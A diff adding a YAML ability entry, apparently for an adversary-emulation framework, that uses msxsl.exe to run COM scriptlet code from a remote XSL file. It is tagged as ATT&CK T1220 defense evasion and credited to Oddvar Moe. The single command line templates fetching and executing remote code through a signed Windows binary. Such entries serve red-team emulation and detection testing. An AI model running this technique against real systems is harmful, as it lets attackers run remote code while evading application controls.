@@ -1,0 +1,21 @@
+- id: 62de1c6c-030b-6459-04c0-afe3ebf2eabf
+  name: msxsl.exe - Run COM Scriptlet code within the shellcode.xml(xsl) file (remote).
+  description: Run COM Scriptlet code within the shellcode.xml(xsl) file (remote).
+  tactic: defense-evasion
+  technique:
+    attack_id: T1220
+    name: System Binary Proxy Execution
+  platforms:
+    windows:
+      cmd:
+        command: 'msxsl.exe #{host.file.path} {REMOTEURL:.xsl}'
+  singleton: false
+  privilege: User
+  repeatable: true
+  buckets:
+  - defense-evasion
+  version: '1.0'
+  author: Oddvar Moe
+  created: '2018-05-25'
+  modified: '2018-05-25'
+  operating_system: Windows All Versions
